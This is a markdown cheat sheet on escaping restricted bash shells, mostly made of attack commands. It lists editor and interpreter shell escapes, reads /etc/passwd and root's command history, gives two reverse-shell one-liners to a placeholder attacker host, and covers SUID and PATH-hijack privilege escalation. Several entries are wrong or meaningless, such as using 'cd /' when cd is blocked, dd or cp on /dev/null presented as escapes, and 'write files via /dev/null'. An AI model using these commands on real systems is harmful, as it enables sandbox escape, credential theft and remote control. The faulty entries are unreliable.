# Bash Jail Escape Compendium

## Escape Decision Tree

```
Restricted shell (rbash/rksh)
├── Can you use cd?
│   ├── Yes → cd /; sh to switch to a full shell
│   └── No → find an editor/other command
├── Can you use quotes/escaping?
│   ├── Yes → `whoami` or $(whoami)
│   └── No → find another way to execute commands
├── Can you access special files?
│   ├── /dev/tcp → reverse shell
│   ├── /proc → read sensitive files
│   └── Can you read HISTFILE → read command history
└── Is there a command allowlist?
    ├── vi/vim → :!/bin/sh escape
    ├── awk → awk 'BEGIN {system("id")}'
    ├── find → find ... -exec
    └── python/perl → execute commands directly
```

## Escape Techniques

### 1. Editor Escape
```bash
vi/vim: :!/bin/sh  or  :!/bin/bash
vim:   :shell
less:  !/bin/sh
more:  !/bin/sh
man:   !/bin/sh
```

### 2. Programming Language Escape
```bash
awk:    awk 'BEGIN {system("whoami")}'
perl:   perl -e 'system("whoami")'
python: python -c 'import os; os.system("whoami")'
ruby:   ruby -e 'system("whoami")'
lua:    lua -e 'os.execute("whoami")'
```

### 3. File Operation Escape
```bash
find:   find / -exec whoami \;
dd:     dd if=/dev/null of=/dev/null
cp:     cp /dev/null /tmp/a; cat /tmp/a
```

### 4. Special File Descriptors
```bash
# Read /etc/passwd
cat /etc/passwd
dd if=/etc/passwd
```

### 5. Read Command History
```bash
cat ~/.bash_history
cat /root/.bash_history
```

### 6. Reverse Shell
```bash
bash -i >& /dev/tcp/attacker_ip/port 0>&1
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## rbash Specific Restrictions

| Restriction | Bypass Method |
|------|---------|
| Cannot cd | `cd /; /bin/bash` |
| Cannot use / | Use relative paths or built-in commands |
| Cannot use $() | Backticks `` `$var` `` |
| Cannot use environment variables | Inherit parent process environment |
| Cannot redirect | Write files via `/dev/null` |

## Privilege Escalation via SUID

```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Common SUID binaries usable for privilege escalation
/usr/bin/sudo
/usr/bin/python
/usr/bin/perl
/bin/more
/bin/less
/bin/awk
/bin/nice
```

## Leveraging the Path Variable

```bash
# If you can set PATH
export PATH=/tmp:$PATH
# Place a malicious program in /tmp
```
